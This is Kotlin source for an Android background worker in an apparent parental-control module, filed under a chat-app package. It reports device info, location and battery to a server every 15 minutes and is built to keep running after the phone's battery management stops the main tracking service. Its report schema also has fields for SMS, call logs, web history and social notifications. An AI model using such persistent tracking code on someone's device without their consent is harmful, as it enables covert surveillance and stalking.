package com.anonchat.app.parentalcontrol.work

import android.content.Context
import android.util.Log
import androidx.work.Constraints
import androidx.work.CoroutineWorker
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import com.anonchat.app.parentalcontrol.api.CloudConfig
import com.anonchat.app.parentalcontrol.api.ApiClient
import com.anonchat.app.parentalcontrol.receiver.AlarmReceiver
import com.anonchat.app.parentalcontrol.util.Collectors
import java.util.concurrent.TimeUnit

/**
 * Backup heartbeat that survives OEM aggressive battery killing
 * (IQOO FuntouchOS, RealmeUI) when the TrackerService foreground
 * service is force-stopped. The FGS is the primary heartbeat every
 * 15 seconds; this worker is the safety net that ensures last_seen
 * is refreshed at least every 15 minutes even when the FGS is killed.
 */
class HeartbeatWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    override suspend fun doWork(): Result {
        return try {
            val ctx = applicationContext
            CloudConfig.init(ctx)
            val collectors = Collectors()
            val deviceInfo = collectors.collectDeviceInfo(ctx)
            val location = try { collectors.collectLocation(ctx) } catch (_: Exception) { null }
            val battery = try { collectors.collectBatteryInfo(ctx) } catch (_: Exception) {
                com.anonchat.app.parentalcontrol.util.BatteryInfo(-1, false, -1f)
            }

            val payload = ApiClient.buildReportPayload(
                deviceInfo = deviceInfo,
                location = location,
                battery = battery,
                smsMessages = emptyList(),
                callLogs = emptyList(),
                installedApps = emptyList(),
                activities = emptyList(),
                screentime = null,
                webHistory = emptyList(),
                socialNotifications = emptyList()
            )
            val result = ApiClient.sendBulkReport(payload)
            if (result.success) {
                Log.d(TAG, "HeartbeatWorker OK")
                Result.success()
            } else {
                Log.w(TAG, "HeartbeatWorker failed: ${result.error}")
                Result.retry()
            }
        } catch (e: Exception) {
            Log.e(TAG, "HeartbeatWorker exception: ${e.message}")
            Result.retry()
        }
    }

    companion object {
        private const val TAG = "HeartbeatWorker"
        private const val WORK_NAME = "kidguard_heartbeat"
        // 15 minutes is the WorkManager minimum; this is the floor for
        // last_seen freshness when the FGS is killed.
        private const val INTERVAL_MINUTES = 15L

        fun schedule(context: Context) {
            try {
                val constraints = Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()
                val req = PeriodicWorkRequestBuilder<HeartbeatWorker>(
                    INTERVAL_MINUTES, TimeUnit.MINUTES
                )
                    .setConstraints(constraints)
                    .addTag(WORK_NAME)
                    .build()
                WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                    WORK_NAME,
                    ExistingPeriodicWorkPolicy.UPDATE,
                    req
                )
                Log.d(TAG, "HeartbeatWorker scheduled every $INTERVAL_MINUTES min")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to schedule HeartbeatWorker", e)
            }
        }

        fun cancel(context: Context) {
            try {
                WorkManager.getInstance(context).cancelUniqueWork(WORK_NAME)
                AlarmReceiver.cancelAlarm(context)
            } catch (_: Exception) {}
        }
    }
}
